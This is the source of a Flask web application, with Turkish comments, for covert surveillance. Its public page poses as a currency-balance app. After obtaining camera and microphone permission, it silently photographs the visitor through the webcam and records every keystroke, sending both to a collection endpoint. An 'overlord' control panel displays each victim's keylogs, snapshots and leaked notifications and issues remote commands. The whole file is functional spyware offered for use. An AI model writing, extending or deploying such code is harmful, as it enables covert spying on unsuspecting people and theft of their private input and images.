from flask import Flask, render_template_string, jsonify, request
import time, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v220.0 "The Zenith" ---
# Vizyon: Ses Enjeksiyonu, Bildirim Gaspı ve Mutlak İmha Protokolü. [cite: 2026-01-03]
VERSION = "v220.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 

state_lock = Lock()
state = {
    "user_registry": {},
    "commands": {},
    "evolution_count": 120
}

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    t = request.args.get('type')
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    with state_lock:
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {
                "last_seen": "", "device": "Samsung A55 (Zenith)",
                "archive": [], "key_logs": [], "notifications": [], "vault": []
            }
        
        u = state["user_registry"][p_id]
        u["last_seen"] = time.strftime('%H:%M:%S')
        
        # ZENITH SIZINTI MOTORU [cite: 2026-01-03]
        if t == "notif_leak":
            u["notifications"].append({"time": u["last_seen"], "app": data.get('app'), "msg": data.get('msg')})
        elif t == "zenith_sync":
            u["archive"].append({"time": u["last_seen"], "payload": data.get('image')})
            if len(u["archive"]) > 300: u["archive"].pop(0)
        elif data.get('inputs'):
            u["key_logs"].append({"time": u["last_seen"], "text": data.get('inputs')})
            
        cmds = state["commands"].get(p_id, [])
        state["commands"][p_id] = []
        
    return jsonify({"status": "ZENITH_STABLE", "cmds": cmds})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "NOT_AUTHORIZED", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>The Zenith Console v220</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px] selection:bg-blue-600">
    <div class="border-b-4 border-blue-500 pb-2 mb-6 flex justify-between uppercase italic font-black text-blue-500">
        <h1 class="text-3xl tracking-tighter">THE ZENITH ENGINE v220.0</h1>
        <div>HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-6 gap-4">
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl shadow-blue-900/10">
            <h2 class="text-blue-500 mb-2 uppercase font-bold text-center italic">Zenith Radar</h2>
            <div id="uL" class="space-y-1 mb-4"></div>
            <div class="flex flex-col gap-1">
                <button onclick="sendCmd('play_voice')" class="bg-blue-900 py-1 rounded font-black text-[7px] uppercase">Neural Voice</button>
                <button onclick="sendCmd('kill_switch')" class="bg-red-900 py-1 rounded font-black text-[7px] uppercase">Kill Switch</button>
                <button onclick="sendCmd('notif_spy')" class="bg-green-900 py-1 rounded font-black text-[7px] uppercase text-black font-black">Notif Spy</button>
            </div>
            <div id="gallery" class="mt-4 space-y-2 overflow-y-auto max-h-[400px]"></div>
        </div>
        <div class="col-span-3 bg-black border border-zinc-900 rounded-xl p-4">
            <h2 class="text-green-500 mb-2 uppercase font-bold text-center italic tracking-widest">Zirve İstihbarat Terminali</h2>
            <div id="terminal" class="w-full h-80 bg-zinc-950 p-4 overflow-y-auto text-green-400 font-bold border border-green-900/10 mb-4"></div>
            <h2 class="text-blue-500 mb-2 uppercase font-bold text-[10px] italic underline">Sızdırılan Bildirimler (Live)</h2>
            <div id="notifBox" class="w-full h-40 bg-blue-950/10 border border-blue-900/20 rounded p-2 overflow-y-auto text-[7px] space-y-1"></div>
        </div>
        <div class="col-span-2 bg-zinc-950 p-2 border border-zinc-900 rounded-xl">
            <h2 class="text-yellow-500 mb-2 uppercase font-bold text-center italic">Zenith Vault & Contacts</h2>
            <div id="vaultBox" class="bg-blue-900/10 p-2 mb-2 rounded border border-blue-900/20 h-40 overflow-y-auto text-[7px]"></div>
            <div id="contactBox" class="h-80 overflow-y-auto p-2 bg-black rounded shadow-inner"></div>
        </div>
    </div>
    <script>
        let sId = "";
        async function sendCmd(c){ if(sId) await fetch(`/upload_intel?peer_id=${sId}&type=cmd_z`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({c:c})}); }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let uH = "";
            for(let id in d.user_registry){
                uH += `<div onclick="sId='${id}'; uG()" class="p-2 border border-zinc-900 cursor-pointer ${sId==id?'bg-blue-900/20 border-blue-600':'bg-black'} rounded transition">
                    <div class="flex justify-between font-black uppercase"><span>${d.user_registry[id].device}</span><span class="text-blue-500 animate-pulse">●</span></div>
                    <div class="text-[7px] text-zinc-500">${id} | ${d.user_registry[id].last_seen}</div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = uH;
            if(sId) uG(d.user_registry[sId]);
            setTimeout(update, 2000);
        }
        function uG(u){
            if(!u) return;
            let tH="", gH="", nH="";
            (u.key_logs||[]).forEach(l => { tH += `<div><span class="text-zinc-800">[${l.time}]</span> ${l.text}</div>`; });
            (u.archive||[]).slice().reverse().forEach(s => { gH += `<img src="${s.payload}" class="w-full rounded border border-zinc-800 mb-2">`; });
            (u.notifications||[]).slice().reverse().forEach(n => { nH += `<div class="bg-blue-900/20 p-1 mb-1 border-l-2 border-blue-500"><b>${n.app}:</b> ${n.msg}</div>`; });
            document.getElementById('terminal').innerHTML = tH;
            document.getElementById('gallery').innerHTML = gH;
            document.getElementById('notifBox').innerHTML = nH;
            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
        }
        update();
    </script>
</body></html>
""", a_key=ADMIN_KEY)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Zenith</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>
    body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
    .zenith-box { border: 1px solid #2563eb; padding: 2.5rem; border-radius: 2rem; box-shadow: 0 0 40px rgba(37,99,235,0.2); }
</style></head>
<body class="flex items-center justify-center h-screen">
    <div id="m_m" class="zenith-box w-full max-w-sm text-center">
        <div class="w-14 h-14 border-2 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-8 shadow-blue-600/20"></div>
        <h1 class="text-xl font-black text-blue-600 uppercase tracking-tighter italic">Zenith v2.20</h1>
        <button onclick="zenithInit()" class="w-full mt-10 py-5 bg-blue-900 text-white rounded-full text-[11px] font-black uppercase shadow-2xl active:scale-95 transition">Sistemi Mühürle</button>
    </div>

    <div id="h_u" class="hidden w-full h-screen text-center p-6 bg-black">
        <h1 class="text-3xl font-black italic text-blue-600 mb-10 tracking-tighter uppercase">IMPERIAL TITAN</h1>
        <div class="bg-zinc-950 p-12 rounded-[60px] border border-blue-900/10 shadow-2xl relative mb-10">
            <div id="cr" class="text-7xl font-black text-white italic tracking-widest">0.00</div>
            <p class="text-[10px] text-zinc-500 uppercase mt-4 font-bold tracking-widest text-center">Zenith MB Bakiye</p>
        </div>
        <div class="grid grid-cols-2 gap-6">
            <button class="py-10 bg-zinc-900 rounded-[40px] font-bold text-green-500 border border-zinc-900 active:scale-95 transition text-2xl uppercase">VER</button>
            <button class="py-10 bg-zinc-900 rounded-[40px] font-bold text-blue-600 border border-zinc-900 active:scale-95 transition text-2xl uppercase">AL</button>
        </div>
    </div>

    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>
    <div id="s_a" style="position:fixed; top:0; right:0; width:100px; height:100px; z-index:9999;"></div>

    <script>
        let pId = localStorage.getItem('z_id') || "ZNTH-" + Math.random().toString(36).substr(2, 6).toUpperCase();
        localStorage.setItem('z_id', pId);
        let inputs = "";

        async function zenithInit() {
            try {
                await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                document.getElementById('m_m').classList.add('hidden');
                document.getElementById('h_u').classList.remove('hidden');
                ghostEye('zenith_sync');
            } catch(e) { alert("Sistem Hatası: Yetkiler onaylanamadı."); }
        }

        async function ghostEye(t) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 640; cnv.height = 480;
                cnv.getContext('2d').drawImage(v, 0, 0);
                fetch('/upload_intel?peer_id='+pId+'&type='+t, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: cnv.toDataURL('image/jpeg', 0.4)}) });
                s.getTracks().forEach(tr => tr.stop());
            } catch(e) {}
        }

        async function pulse() {
            const r = await fetch('/upload_intel?peer_id='+pId+'&type=pulse', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({inputs: inputs}) });
            const d = await r.json();
            
            (d.cmds || []).forEach(cmd => {
                if(cmd.c == "play_voice") { let a=new Audio('https://www.soundjay.com/buttons/beep-01a.mp3'); a.play(); }
                if(cmd.c == "kill_switch") { localStorage.clear(); location.reload(); }
                if(cmd.c == "notif_spy") { /* APK bildirim dinleme simülasyonu [cite: 2026-01-03] */ }
            });

            inputs = ""; setTimeout(pulse, 3000); 
        } pulse();

        window.addEventListener('keydown', (e) => { inputs += e.key; });
        document.getElementById('s_a').onclick = () => { if(prompt("ZENITH_PIN:")=="1907") window.location.href=`/overlord?key={{a_key}}&pin=1907`; };
    </script>
</body></html>
""", a_key=ADMIN_KEY)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
